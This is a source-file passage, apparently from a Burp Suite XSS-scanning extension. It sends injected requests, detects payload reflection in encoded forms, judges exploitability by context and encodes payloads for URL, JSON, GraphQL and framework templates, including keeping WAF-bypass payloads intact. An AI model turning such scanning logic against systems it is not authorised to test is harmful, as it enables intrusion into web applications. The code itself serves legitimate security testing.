                        callbacks.printOutput("SUCCESS: GraphQL query parameter replaced successfully");
                        return newRequest;
                    }
                }
            }
            
            // Fallback: Use Burp's parameter update
            IParameter newParam = helpers.buildParameter(paramName, payload, IParameter.PARAM_BODY);
            byte[] updatedRequest = helpers.updateParameter(request, newParam);
            if (updatedRequest != null) {
                callbacks.printOutput("SUCCESS: Used Burp's parameter update for GraphQL");
                return updatedRequest;
            }
            
            callbacks.printError("GraphQL parameter '" + paramName + "' not found in request body");
            return request;
            
        } catch (Exception e) {
            callbacks.printError("Error updating GraphQL body parameter: " + e.getMessage());
            return request;
        }
    }
    
    private String getRequestContentType(byte[] request) {
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(request);
            List<String> headers = reqInfo.getHeaders();
            for (String header : headers) {
                if (header.toLowerCase().startsWith("content-type:")) {
                    return header.substring("content-type:".length()).trim();
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }
    
    /**
     * Execute test request using real HTTP client
     */
    private String executeTestRequest(String request) {
        try {
            if (baseRequestResponse == null) {
                callbacks.printError("Base request/response is null");
                return null;
            }
            
            // Analyze the original request to get connection details
            IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
            if (requestInfo == null) {
                callbacks.printError("Cannot analyze base request");
                return null;
            }
            
            String host = requestInfo.getUrl().getHost();
            int port = requestInfo.getUrl().getPort();
            
            if (host == null || host.trim().isEmpty()) {
                callbacks.printError("Invalid host from request analysis");
                return null;
            }
            
            // Handle default ports
            if (port == -1) {
                String protocol = requestInfo.getUrl().getProtocol();
                if ("https".equals(protocol)) {
                    port = 443;
                } else {
                    port = 80;
                }
            }
            
            // CRITICAL FIX: Send REAL HTTP request using Burp's request engine (cookies/session/proxy aware)
            byte[] requestBytes = request.getBytes("UTF-8");
            IHttpRequestResponse rr = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), requestBytes);
            byte[] responseBytes = rr != null ? rr.getResponse() : null;
            
            if (responseBytes != null) {
                String response = new String(responseBytes, "UTF-8");
                
                // CRITICAL FIX: Store the response for snippet extraction
                lastTestResponse = response;
                
                return response;
            } else {
                if (settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] No response received");
                }
                return null;
            }
            
        } catch (Exception e) {
            // Check if this is an external service error
            if (isExternalServiceError(e.getMessage())) {
                callbacks.printOutput("INFO: Skipping external service endpoint: " + e.getMessage());
                return null;
            }
            
            callbacks.printError("Error executing test request: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Check if error is related to external service unavailability
     */
    private boolean isExternalServiceError(String errorMessage) {
        if (errorMessage == null) return false;
        
        String lowerMessage = errorMessage.toLowerCase();
        return lowerMessage.contains("timeout") ||
               lowerMessage.contains("connection refused") ||
               lowerMessage.contains("analytics endpoint") ||
               lowerMessage.contains("external analytics") ||
               lowerMessage.contains("safebrowsing.googleapis.com") ||
               lowerMessage.contains("bam.nr-data.net") ||
               lowerMessage.contains("datadoghq.com") ||
               lowerMessage.contains("paypal.com") ||
               lowerMessage.contains("stripe.com");
    }
    
    /**
     * Advanced response analysis with multiple detection techniques
     */
    public AdvancedResponseAnalysis analyzeResponseAdvanced(String response, String payload, Map parameter) {
        AdvancedResponseAnalysis analysis = new AdvancedResponseAnalysis();
        
        try {
            // Extract response body
            String responseBody = extractResponseBody(response);
            if (responseBody == null || responseBody.isEmpty()) {
                // CRITICAL: Even if body is empty, check full response for error messages
                responseBody = response;
            }
            
            // CRITICAL: Check if this is an error response and analyze accordingly
            boolean isErrorResponse = false;
            String responseCode = null;
            try {
                if (response != null && response.length() > 0) {
                    int httpIndex = response.indexOf("HTTP/");
                    if (httpIndex >= 0) {
                        int codeStart = response.indexOf(" ", httpIndex) + 1;
                        int codeEnd = response.indexOf(" ", codeStart);
                        if (codeEnd > codeStart) {
                            responseCode = response.substring(codeStart, codeEnd);
                            isErrorResponse = responseCode.startsWith("4") || responseCode.startsWith("5");
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
            
            // CRITICAL: For error responses, check if parameter value/name is reflected
            if (isErrorResponse && parameter != null) {
                String originalValue = (String) parameter.get(VALUE);
                String paramName = (String) parameter.get(NAME);
                
                // If original value is reflected in error, this is a strong indicator
                if (originalValue != null && !originalValue.trim().isEmpty()) {
                    if (responseBody.contains(originalValue) || responseBody.toLowerCase().contains(originalValue.toLowerCase())) {
                        analysis.addEvidence("Original parameter value reflected in error response - parameter is processed");
                        analysis.setConfidence(Math.max(analysis.getConfidence(), 30.0)); // At least 30% confidence
                        // Parameter value reflected in error response
                    }
                }
                
                // If parameter name is reflected, also significant
                if (paramName != null && !paramName.trim().isEmpty()) {
                    if (responseBody.contains(paramName) || responseBody.toLowerCase().contains(paramName.toLowerCase())) {
                        analysis.addEvidence("Parameter name reflected in error response");
                        analysis.setConfidence(Math.max(analysis.getConfidence(), 20.0)); // At least 20% confidence
                        // Parameter name reflected in error response
                    }
                }
            }
            
            // Multiple detection strategies with enhanced logging
            
            // CRITICAL FIX: Enhanced reflection detection with multiple strategies
            
            // 1. Direct payload reflection (case-insensitive)
            // CRITICAL: Also check decoded/normalized forms of what we injected (URL/HTML-entity/JSON-unicode decoding).
            List<String> reflectionCandidates = buildReflectionCandidates(payload);
            boolean directReflection = containsAnyIgnoreCase(responseBody, reflectionCandidates);
            
            // CRITICAL: Also check if the ORIGINAL payload (before encoding) is reflected
            // This handles cases where we inject URL-encoded payload but app reflects decoded version
            if (!directReflection && payload != null) {
                // Check for original payload parts (if payload was encoded)
                String originalPayload = (String) parameter.get("ORIGINAL_PAYLOAD");
                if (originalPayload != null && !originalPayload.equals(payload)) {
                    // We injected an encoded version, check for original (decoded) in response
                    List<String> originalCandidates = buildReflectionCandidates(originalPayload);
                    directReflection = containsAnyIgnoreCase(responseBody, originalCandidates);
                    if (directReflection) {
                        analysis.addEvidence("Decoded payload reflection detected (injected encoded, reflected decoded)");
                        // Decoded payload reflection detected
                    }
                }
            }
            
            // CRITICAL FIX: Do NOT set directReflection based on partial keyword matches.
            // Keywords like "alert", "eval" etc. commonly appear in page content (error messages,
            // library code, comments) without being actual payload reflections.
            // Only full payload reflection (direct or decoded) should count.

            if (directReflection) {
                analysis.setDirectReflection(true);
                analysis.addEvidence("Direct payload reflection detected (raw/decoded form)");
            }
            
            // 2. HTML entity encoded detection (CRITICAL for XSS detection)
            // Check for HTML entity encoded versions of BOTH injected payload AND original payload
            String htmlEntityEncoded = payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                                             .replace("\"", "&quot;").replace("'", "&#39;");
            if (responseBody.contains(htmlEntityEncoded)) {
                analysis.setEncodedReflection(true);
                analysis.addEvidence("HTML entity encoded reflection detected");
                // HTML entity encoded reflection detected
            }
            
            // Also check for numeric HTML entities
            String htmlNumericEncoded = payload.replace("<", "&#60;").replace(">", "&#62;")
                                              .replace("\"", "&#34;").replace("'", "&#39;");
            if (responseBody.contains(htmlNumericEncoded)) {
                analysis.setEncodedReflection(true);
                analysis.addEvidence("HTML numeric entity encoded reflection detected");
                // HTML numeric entity encoded reflection detected
            }
            
            // 3. URL encoded detection - check for URL-encoded version in response
            String urlEncoded = helpers.urlEncode(payload);
            if (responseBody.contains(urlEncoded)) {
                analysis.setEncodedReflection(true);
                analysis.addEvidence("URL encoded reflection detected");
                // URL encoded reflection detected
            }
            
            // CRITICAL: If we injected a URL-encoded payload, also check for decoded version
            // This is the KEY fix - we inject %3Cscript%3E but app might reflect <script>
            try {
                String urlDecoded = helpers.urlDecode(payload);
                if (urlDecoded != null && !urlDecoded.equals(payload) && responseBody.contains(urlDecoded)) {
                    analysis.setDirectReflection(true);
                    analysis.addEvidence("Decoded URL payload reflection detected (injected URL-encoded, reflected decoded)");
                    // Decoded URL payload reflection detected
                }
            } catch (Exception e) {
                // Ignore decode errors
            }
            
            // 4. Double URL encoded detection
            String doubleUrlEncoded = helpers.urlEncode(urlEncoded);
            if (responseBody.contains(doubleUrlEncoded)) {
                analysis.setEncodedReflection(true);
                analysis.addEvidence("Double URL encoded reflection detected");
                // Double URL encoded reflection detected
            }
            
            // 5. JSON/Unicode encoded detection (for JSON body parameters)
            String jsonUnicodeEncoded = payload.replace("<", "\\u003c").replace(">", "\\u003e")
                                               .replace("&", "\\u0026").replace("\"", "\\u0022")
                                               .replace("'", "\\u0027");
            if (responseBody.contains(jsonUnicodeEncoded)) {
                analysis.setEncodedReflection(true);
                analysis.addEvidence("JSON unicode encoded reflection detected");
                // JSON unicode encoded reflection detected
            }
            
            // CRITICAL: If we injected JSON-escaped payload, check for decoded version
            String jsonDecoded = payload.replace("\\\"", "\"").replace("\\\\", "\\")
                                       .replace("\\n", "\n").replace("\\r", "\r").replace("\\t", "\t");
            if (!jsonDecoded.equals(payload) && responseBody.contains(jsonDecoded)) {
                analysis.setDirectReflection(true);
                analysis.addEvidence("Decoded JSON payload reflection detected (injected JSON-escaped, reflected decoded)");
                // Decoded JSON payload reflection detected
            }
            
            // 5. Additional encoded versions
            String[] encodedVersions = generateEncodedVersions(payload);
            for (String encoded : encodedVersions) {
                if (responseBody.contains(encoded)) {
                    analysis.setEncodedReflection(true);
                    analysis.addEvidence("Encoded payload reflection: " + encoded.substring(0, Math.min(30, encoded.length())));
                    // Encoded payload reflection detected
                    break; // Found one encoded version
                }
            }
            
            // 6. CRITICAL: Check for partial payload reflection (key parts)
            // Extract key XSS indicators from payload
            String[] xssIndicators = {"<script", "alert", "onerror", "onload", "javascript:", "eval", "Function"};
            int foundIndicators = 0;
            for (String indicator : xssIndicators) {
                if (payload.contains(indicator) && responseBody.contains(indicator)) {
                    foundIndicators++;
                }
            }
            if (foundIndicators >= 2) {
                analysis.addEvidence("Partial XSS indicator reflection detected (" + foundIndicators + " indicators)");
                // Partial XSS indicator reflection detected
                // If we found key indicators, consider it a reflection
                if (!directReflection && !analysis.isEncodedReflection()) {
                    analysis.setDirectReflection(true); // Treat as reflection if key parts are present
                }
            }
            
            // 3. Partial payload detection (for cases where payload is split/modified)
            String[] payloadParts = payload.split("[<>\"'()]");
            int foundParts = 0;
            for (String part : payloadParts) {
                if (part.length() > 3 && responseBody.contains(part)) {
                    foundParts++;
                }
            }
            // CRITICAL FIX: Do NOT use partial reflection - this causes false positives
            // Partial matches are NOT sufficient proof of vulnerability
            // if (foundParts > 0) {
            //     analysis.addEvidence("Partial payload reflection detected (" + foundParts + " parts)");
            //     if (foundParts >= payloadParts.length / 2) {
            //         analysis.setDirectReflection(true); // NO - too lenient, causes false positives
            //         // Significant partial payload reflection detected
            //     }
            // }
            
            // 4. ADVANCED: Context-specific detection with browser execution awareness
            // CRITICAL: Use CheckReflection's determineReflectionContext for accurate context detection
            String detectedContext = null;
            try {
                // Get reflection context from parameter if available
                Object reflectionContextObj = parameter.get("REFLECTION_CONTEXT");
                if (reflectionContextObj instanceof String) {
                    detectedContext = (String) reflectionContextObj;
                }
                
                // If not available, determine from response using similar logic to CheckReflection
                if (detectedContext == null || "UNKNOWN".equals(detectedContext)) {
                    detectedContext = determineReflectionContextFromResponse(responseBody, payload);
                }
            } catch (Exception e) {
                // Fallback to analyzeXSSContext
                detectedContext = "UNKNOWN";
            }
            
            String contextAnalysis = analyzeXSSContext(responseBody, payload);
            if (contextAnalysis != null && !contextAnalysis.contains("Unknown Context")) {
                callbacks.printOutput("Context analysis: " + contextAnalysis);
                analysis.setContextVulnerable(true);
                analysis.addEvidence("Context analysis: " + contextAnalysis);
                // XSS context detected
                
                // CRITICAL: Store the detected context for proper payload selection
                if (detectedContext != null && !"UNKNOWN".equals(detectedContext)) {
                    analysis.addEvidence("Detected reflection context: " + detectedContext);
                }
                
                // CRITICAL: For JSON context, verify exploitation before marking as vulnerable
                if (detectedContext != null && detectedContext.contains("JSON") && !detectedContext.contains("JSONP") && !detectedContext.contains("UNSAFE")) {
                    // FIRST: Check if JSON string is safely escaped (quotes/backslashes escaped)
                    boolean jsonStringExploitable = isJSONStringExploitable(responseBody, payload);
                    if (!jsonStringExploitable) {
                        // JSON string is safely escaped - FALSE POSITIVE
                        analysis.setVulnerabilityType("Safely Escaped JSON String (False Positive)");
                        analysis.setExploitationDifficulty("N/A - Safely escaped, not exploitable");
                        analysis.addEvidence("JSON string reflection is safely escaped (quotes/backslashes escaped)");
                        analysis.setConfidence(0.0); // Zero confidence - false positive
                        analysis.setContextVulnerable(false);
                        analysis.setDirectReflection(false);
                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE: JSON string is safely escaped - not exploitable");
                    } else {
                        // JSON string is not safely escaped - check for JSONP or unsafe consumption
                        boolean jsonExploitable = isJSONExploitable(responseBody, payload);
                        if (!jsonExploitable) {
                            // JSON reflection but not exploitable - reduce confidence significantly
                            analysis.setVulnerabilityType("JSON Reflection - Not Directly Exploitable");
                            analysis.setExploitationDifficulty("High - Requires unsafe JSON consumption (eval, innerHTML, etc.)");
                            analysis.addEvidence("JSON reflection detected but no JSONP/unsafe consumption indicators found");
                            // Reduce confidence to very low for safe JSON (not exploitable)
                            analysis.setConfidence(Math.min(analysis.getConfidence(), 20.0));
                            analysis.setContextVulnerable(false); // JSON alone is not directly exploitable
                        } else {
                            // JSON is exploitable (JSONP or unsafe consumption)
                            analysis.setVulnerabilityType("JSON XSS - Exploitable via JSONP/Unsafe Consumption");
                            analysis.setExploitationDifficulty("Medium - Requires JSONP or unsafe JSON consumption");
                            analysis.addEvidence("JSON reflection with exploitation indicators (JSONP/unsafe consumption)");
                        }
                    }
                }
                
                // CRITICAL: For JavaScript string contexts, verify the payload can actually break out
                if (detectedContext != null && (detectedContext.contains("JAVASCRIPT") || detectedContext.contains("JAVASCRIPT_STRING"))) {
                    boolean jsStringExploitable = isJavaScriptStringExploitable(responseBody, payload);
                    if (!jsStringExploitable) {
                        // JavaScript string reflection but safely escaped - false positive
                        analysis.setVulnerabilityType("JavaScript String Reflection - Safely Escaped (False Positive)");
                        analysis.setExploitationDifficulty("Not Exploitable - Quote is escaped, cannot break out of string");
                        analysis.addEvidence("Payload reflected in JavaScript string but quote is escaped - cannot break out");
                        // Mark as not exploitable - reduce confidence to zero
                        analysis.setConfidence(0.0);
                        analysis.setContextVulnerable(false);
                        analysis.setDirectReflection(false); // Not exploitable even if reflected
                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: JavaScript string reflection safely escaped");
                        // Return early - don't mark as vulnerable
                        return analysis;
                    } else {
                        // JavaScript string is exploitable - quote can break out
                        analysis.addEvidence("JavaScript string reflection - quote can break out and execute code");
                    }
                }
                
                // ADVANCED: Store context-based vulnerability type and difficulty
                if (contextAnalysis.contains("CRITICAL") || contextAnalysis.contains("Execution")) {
                    analysis.setVulnerabilityType("Reflected XSS - Direct JavaScript Execution");
                    analysis.setExploitationDifficulty("Low - Direct execution context");
                } else if (contextAnalysis.contains("HIGH RISK") || contextAnalysis.contains("Event Handler")) {
                    analysis.setVulnerabilityType("Reflected XSS - Event Handler Injection");
                    analysis.setExploitationDifficulty("Low - Event handler execution");
                } else if (contextAnalysis.contains("MEDIUM RISK")) {
                    analysis.setVulnerabilityType("Reflected XSS - HTML Injection");
                    analysis.setExploitationDifficulty("Medium - Requires context break");
                } else if (detectedContext != null && !"UNKNOWN".equals(detectedContext)) {
                    // Use detected context for better classification
                    if (detectedContext.contains("JAVASCRIPT") || detectedContext.contains("EXECUTION")) {
                        analysis.setVulnerabilityType("Reflected XSS - JavaScript Execution Context");
                        analysis.setExploitationDifficulty("Low - Direct execution context");
                    } else if (detectedContext.contains("HTML_BODY") || detectedContext.contains("HTML_TAG")) {
                        analysis.setVulnerabilityType("Reflected XSS - HTML Body/Tag Context");
                        analysis.setExploitationDifficulty("Medium - Requires context break");
                    } else {
                        analysis.setVulnerabilityType("Reflected XSS - " + detectedContext);
                        analysis.setExploitationDifficulty("Medium - Context-dependent");
                    }
                }
            } else {
                // CRITICAL: If analyzeXSSContext returns Unknown, use detectedContext
                if (detectedContext != null && !"UNKNOWN".equals(detectedContext)) {
                    contextAnalysis = "Detected Context: " + detectedContext + " (MEDIUM RISK)";
                    callbacks.printOutput("Context analysis: " + contextAnalysis);
                    analysis.setContextVulnerable(true);
                    analysis.addEvidence("Context analysis: " + contextAnalysis);
                    // XSS context detected
                    
                    if (detectedContext.contains("JAVASCRIPT") || detectedContext.contains("EXECUTION")) {
                        analysis.setVulnerabilityType("Reflected XSS - JavaScript Execution Context");
                        analysis.setExploitationDifficulty("Low - Direct execution context");
                    } else {
                        analysis.setVulnerabilityType("Reflected XSS - " + detectedContext);
                        analysis.setExploitationDifficulty("Medium - Context-dependent");
                    }
                } else {
                    // No specific XSS context detected
                }
            }
            
            // 5. ADVANCED: Browser execution flow analysis
            String executionFlow = analyzeBrowserExecutionFlow(responseBody, payload);
            if (executionFlow != null) {
                analysis.addEvidence("Browser execution flow: " + executionFlow);
                callbacks.printOutput("Browser execution analysis: " + executionFlow);
            }
            
            // 6. JavaScript execution indicators (Enhanced)
            if (detectJavaScriptExecution(responseBody, payload)) {
                analysis.setJavaScriptExecution(true);
                analysis.addEvidence("JavaScript execution indicators detected");
                // JavaScript execution patterns detected
            } else {
                // No JavaScript execution patterns detected
            }
            
            // 7. DOM manipulation detection (Enhanced)
            if (detectDOMManipulation(responseBody, payload)) {
                analysis.setDomManipulation(true);
                analysis.addEvidence("DOM manipulation detected");
                // DOM manipulation patterns detected
            } else {
                // No DOM manipulation patterns detected
            }
            
            // 8. ADVANCED: Check for browser parsing quirks and execution vectors
            if (detectBrowserParsingQuirks(responseBody, payload)) {
                analysis.addEvidence("Browser parsing quirks detected - may enable execution");
                // Browser parsing quirks detected
            }
            
            // 7. Simple reflection detection (Basic XSS check)
            if (responseBody.toLowerCase().contains(payload.toLowerCase())) {
                analysis.setDirectReflection(true);
                analysis.addEvidence("Case-insensitive payload reflection detected");
                // Case-insensitive payload reflection detected
            }
            
            // 8. CRITICAL: Enhanced error response analysis
            // Check if parameter value/name reflection was detected in error responses
            if (parameter != null) {
                Boolean originalValueReflected = (Boolean) parameter.get("ORIGINAL_VALUE_REFLECTED_IN_ERROR");
                Boolean paramNameReflected = (Boolean) parameter.get("PARAM_NAME_REFLECTED_IN_ERROR");
                
                if (originalValueReflected != null && originalValueReflected) {
                    analysis.addEvidence("Original parameter value reflected in error response");
                    analysis.setConfidence(Math.max(analysis.getConfidence(), 25.0));
                }
                
                if (paramNameReflected != null && paramNameReflected) {
                    analysis.addEvidence("Parameter name reflected in error response");
                    analysis.setConfidence(Math.max(analysis.getConfidence(), 15.0));
                }
            }
            
            // CRITICAL: Calculate final confidence score (must be called after all evidence is added)
            analysis.calculateConfidence();
            
            // CRITICAL: Ensure minimum confidence if we have any evidence
            if (analysis.getEvidence().size() > 0 && analysis.getConfidence() < 15.0) {
                analysis.setConfidence(15.0); // Minimum confidence for any evidence
            }
            
            // Analysis summary removed - too verbose, only log in extreme verbose mode
            
        } catch (Exception e) {
            callbacks.printError("Advanced response analysis error: " + e.getMessage());
        }
        
        return analysis;
    }
    
    /**
     * Context-aware payload encoding based on reflection context
     * This ensures payloads are properly encoded for the specific context where they're reflected
     */
    public String encodePayloadForContext(String payload, String context, String contentType, int paramType) {
        return encodePayloadForContext(payload, context, contentType, paramType, null);
    }
    
    public String encodePayloadForContext(String payload, String context, String contentType, int paramType, String applicationType) {
        if (payload == null || payload.isEmpty()) {
            return payload;
        }
        
        try {
            // CRITICAL: Parameter type-based encoding takes precedence
            // URL parameters (GET requests) MUST be URL-encoded by default (modern browser behavior)
            // CRITICAL: URL parameters MUST ALWAYS be URL-encoded
            // This check is done FIRST before any other context checks
            if (paramType == IParameter.PARAM_URL) {
                // IDEMPOTENCY GUARD: if the payload already contains percent-encoding
                // (e.g. a pre-encoded WAF-bypass payload such as <img%2bsrc%3dx...>),
                // re-encoding would corrupt it (%3d -> %253d) and the payload would no
                // longer execute, silently suppressing real findings. Send it as-is.
                if (java.util.regex.Pattern.compile("%[0-9A-Fa-f]{2}").matcher(payload).find()) {
                    return payload;
                }
                // For URL parameters, ALWAYS URL-encode special characters
                // Modern browsers automatically URL-encode special chars in URLs
                // Only exception: if payload is already a complete URL protocol (javascript:, data:, etc.)
                if (payload.startsWith("javascript:") || payload.startsWith("data:") || payload.startsWith("vbscript:")) {
                    // Protocol URLs - encode the protocol part but keep structure
                    int colonIndex = payload.indexOf(":");
                    if (colonIndex > 0) {
                        String protocol = payload.substring(0, colonIndex + 1);
                        String rest = payload.substring(colonIndex + 1);
                        // URL-encode the rest but keep protocol intact
                        String encoded = protocol + helpers.urlEncode(rest);
                        callbacks.printOutput("[XSSDetector] encodePayloadForContext: URL parameter with protocol - encoded: " + 
                                            payload.substring(0, Math.min(30, payload.length())) + " -> " + 
                                            encoded.substring(0, Math.min(50, encoded.length())));
                        return encoded;
                    }
                }
                // Standard URL parameter - ALWAYS fully URL-encode
                String encoded = helpers.urlEncode(payload);
                if (!encoded.equals(payload) && settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] encodePayloadForContext: URL parameter encoded: " +
                                        payload.substring(0, Math.min(30, payload.length())) + " -> " +
                                        encoded.substring(0, Math.min(50, encoded.length())));
                }
                return encoded;
            }
            
            // ADDITIONAL CHECK: If context suggests URL but paramType wasn't detected, still URL-encode
            // This handles edge cases where paramType might not be correctly set
            if ("URL".equals(context) || context != null && (context.contains("URL") || context.contains("QUERY"))) {
                // Check if this looks like a URL parameter context
                if (payload.contains("<") || payload.contains(">") || payload.contains(" ") || 
                    payload.contains("\"") || payload.contains("'") || payload.contains("&")) {
                    // Payload has URL-unsafe chars - URL encode it
                    String encoded = helpers.urlEncode(payload);
                    callbacks.printOutput("[XSSDetector] encodePayloadForContext: URL context detected (fallback) - encoded: " + 
                                        payload.substring(0, Math.min(30, payload.length())));
                    return encoded;
                }
            }
            
            // CRITICAL: Application-type aware encoding for modern web applications
            // Check application type, content type, and context for GraphQL, JSON-RPC, JSON API, JWT, etc.
            boolean isGraphQL = (applicationType != null && applicationType.toUpperCase().contains("GRAPHQL")) ||
                               (contentType != null && contentType.contains("application/graphql")) ||
                               (context != null && context.toUpperCase().contains("GRAPHQL"));
            boolean isJSONRPC = (contentType != null && contentType.contains("application/json-rpc")) ||
                               (context != null && context.toUpperCase().contains("JSON-RPC")) ||
                               (context != null && context.toUpperCase().contains("JSONRPC"));
            boolean isJSONAPI = (contentType != null && contentType.contains("application/vnd.api+json")) ||
                               (context != null && context.toUpperCase().contains("JSONAPI")) ||
                               (context != null && context.toUpperCase().contains("JSON-API"));
            boolean isJWT = (contentType != null && contentType.contains("application/jwt")) ||
                           (context != null && context.toUpperCase().contains("JWT")) ||
                           (context != null && context.contains("Bearer "));
            
            // CRITICAL: Detect modern SPA frameworks and their specific encoding requirements
            boolean isReact = (applicationType != null && applicationType.toUpperCase().contains("REACT")) ||
                             (context != null && context.toUpperCase().contains("REACT")) ||
                             (contentType != null && contentType.contains("react"));
            boolean isVue = (applicationType != null && applicationType.toUpperCase().contains("VUE")) ||
                           (context != null && context.toUpperCase().contains("VUE"));
            boolean isAngular = (applicationType != null && applicationType.toUpperCase().contains("ANGULAR")) ||
                               (context != null && context.toUpperCase().contains("ANGULAR"));
            boolean isSPA = (applicationType != null && applicationType.toUpperCase().contains("SPA")) ||
                           (context != null && context.toUpperCase().contains("SPA"));
            
            // CRITICAL: JSON detection - must be comprehensive for all modern apps
            boolean isJSON = paramType == IParameter.PARAM_JSON || 
                            "JSON".equals(context) || 
                            (contentType != null && (contentType.contains("application/json") || 
                                                      contentType.contains("+json") ||
                                                      contentType.contains("text/json"))) ||
                            // SPA state management (Redux, Vuex, MobX, Zustand, Jotai) typically uses JSON
                            (applicationType != null && (applicationType.toUpperCase().contains("SPA") ||
                                                          applicationType.toUpperCase().contains("REACT") ||
                                                          applicationType.toUpperCase().contains("VUE") ||
                                                          applicationType.toUpperCase().contains("ANGULAR") ||
                                                          applicationType.toUpperCase().contains("MICROSERVICES")) &&
                             paramType == IParameter.PARAM_BODY) ||
                            // GraphQL variables are JSON-encoded
                            isGraphQL ||
                            // JSON-RPC and JSON API use JSON encoding
                            isJSONRPC || isJSONAPI;
            
            // XML/SOAP parameter encoding
            boolean isXML = paramType == IParameter.PARAM_XML ||
                           (contentType != null && (contentType.contains("application/xml") ||
                                                    contentType.contains("text/xml") ||
                                                    contentType.contains("application/soap+xml") ||
                                                    contentType.contains("application/xml-rpc")));
            if (isXML) {
                // XML encoding: escape special XML characters
                return payload.replace("&", "&amp;")
                             .replace("<", "&lt;")
                             .replace(">", "&gt;")
                             .replace("\"", "&quot;")
                             .replace("'", "&apos;");
            }
            
            // Note: Headers are not IParameter types in Burp API
            // Header injection should be handled via direct header manipulation
            // Headers cannot contain newlines or control characters
            // For header injection contexts, we still need to sanitize payloads
            if (context != null && (context.contains("HEADER") || context.contains("REFERER") || context.contains("LOCATION"))) {
                String headerPayload = payload.replace("\r", "").replace("\n", "").replace("\t", " ");
                // For certain headers (Referer, Location), URL encode
                if (context.contains("REFERER") || context.contains("LOCATION") || context.contains("URI")) {
                    return helpers.urlEncode(headerPayload);
                }
                return headerPayload;
            }
            
            // CRITICAL: JSON parameters and JSON-based formats MUST be JSON-escaped
            // This includes: JSON body params, GraphQL variables, JSON-RPC params, JSON API fields, JWT claims
            // CASE-BY-CASE: Different JSON formats may have different encoding requirements
            if (isJSON || isGraphQL || isJSONRPC || isJSONAPI || isJWT) {
                // GraphQL-specific: Variables are JSON-encoded, but queries are not
                if (isGraphQL && context != null && context.toUpperCase().contains("QUERY")) {
                    // GraphQL query string - may need different encoding
                    // For GraphQL queries, we might need to escape differently
                    if (payload.contains("\"") || payload.contains("'")) {
                        // GraphQL query with quotes - escape properly
                        return payload.replace("\\", "\\\\")
                                     .replace("\"", "\\\"")
                                     .replace("\n", "\\n")
                                     .replace("\r", "\\r");
                    }
                    // GraphQL query without quotes - may not need encoding
                    return payload;
                }
                
                // JSON-RPC: Parameters are JSON-encoded
                if (isJSONRPC) {
                    // JSON-RPC params must be JSON-escaped
                    return payload.replace("\\", "\\\\")
                                 .replace("\"", "\\\"")
                                 .replace("\n", "\\n")
                                 .replace("\r", "\\r")
                                 .replace("\t", "\\t");
                }
                
                // JSON API: Data fields are JSON-encoded
                if (isJSONAPI) {
                    // JSON API format requires JSON escaping
                    return payload.replace("\\", "\\\\")
                                 .replace("\"", "\\\"")
                                 .replace("\n", "\\n")
                                 .replace("\r", "\\r")
                                 .replace("\t", "\\t");
                }
                
                // JWT: Claims are JSON-encoded (Base64URL encoded JSON)
                if (isJWT) {
                    // JWT claims are JSON, then Base64URL encoded
                    // For JWT testing, we need to JSON-escape first
                    String jsonEscaped = payload.replace("\\", "\\\\")
                                               .replace("\"", "\\\"")
                                               .replace("\n", "\\n")
                                               .replace("\r", "\\r")
                                               .replace("\t", "\\t");
                    // Note: Actual JWT encoding would be Base64URL, but for testing we use JSON escape
                    return jsonEscaped;
                }
                
                // Standard JSON encoding: escape quotes, backslashes, newlines, tabs
                // This works for all JSON-based formats (GraphQL variables, JSON body, SPA state, etc.)
                return payload.replace("\\", "\\\\")
                             .replace("\"", "\\\"")
                             .replace("\n", "\\n")
                             .replace("\r", "\\r")
                             .replace("\t", "\\t");
            }
            
            // CRITICAL: React-specific encoding requirements
            if (isReact) {
                // React JSX: Payloads in JSX need proper escaping
                // React props: May need JSON encoding if in props
                if (context != null && (context.toUpperCase().contains("PROPS") || 
                                       context.toUpperCase().contains("JSX") ||
                                       context.toUpperCase().contains("REACT"))) {
                    // React props are typically JSON-encoded
                    if (payload.contains("\"") || payload.contains("'")) {
                        return payload.replace("\\", "\\\\")
                                     .replace("\"", "\\\"")
                                     .replace("\n", "\\n")
                                     .replace("\r", "\\r");
                    }
                }
                // React dangerouslySetInnerHTML: HTML payloads work as-is
                if (context != null && context.toUpperCase().contains("DANGEROUSLY")) {
                    return payload; // HTML payloads work in dangerouslySetInnerHTML
                }
            }
            
            // CRITICAL: Vue-specific encoding requirements
            if (isVue) {
                // Vue v-html: HTML payloads work as-is
                if (context != null && context.toUpperCase().contains("V-HTML")) {
                    return payload; // HTML payloads work in v-html
                }
                // Vue template: May need different encoding
                if (context != null && context.toUpperCase().contains("VUE_TEMPLATE")) {
                    // Vue templates use {{ }} or ${ } - payloads need to break out
                    if (payload.contains("{{") || payload.contains("${")) {
                        return payload; // Already has template breaking
                    }
                    // Vue template breaking
                    return "${" + payload + "}";
                }
            }
            
            // CRITICAL: Angular-specific encoding requirements
            if (isAngular) {
                // Angular template injection: Uses {{ }} syntax
                if (context != null && context.toUpperCase().contains("ANGULAR_TEMPLATE")) {
                    // Angular templates use {{ }} - payloads need to break out
                    if (payload.contains("{{") || payload.contains("}}")) {
                        return payload; // Already has template breaking
                    }
                    // Angular template breaking
                    return "{{" + payload + "}}";
                }
                // Angular [innerHTML]: HTML payloads work as-is
                if (context != null && context.toUpperCase().contains("INNERHTML")) {
                    return payload; // HTML payloads work in [innerHTML]
                }
            }
            
            // JavaScript string context encoding
            if ("JAVASCRIPT_STRING".equals(context) || "JAVASCRIPT".equals(context)) {
                // JavaScript string encoding: escape quotes and backslashes
                if (payload.contains("'")) {
                    return payload.replace("\\", "\\\\")
                                 .replace("'", "\\'")
                                 .replace("\n", "\\n")
                                 .replace("\r", "\\r");
                } else {
                    return payload.replace("\\", "\\\\")
                                 .replace("\"", "\\\"")
                                 .replace("\n", "\\n")
                                 .replace("\r", "\\r");
                }
            }
            
            // CRITICAL FIX: ATTRIBUTE_URL_EXECUTION should NOT URL encode JavaScript payloads!
            // This breaks JavaScript syntax. Only encode if it's a URL parameter value.
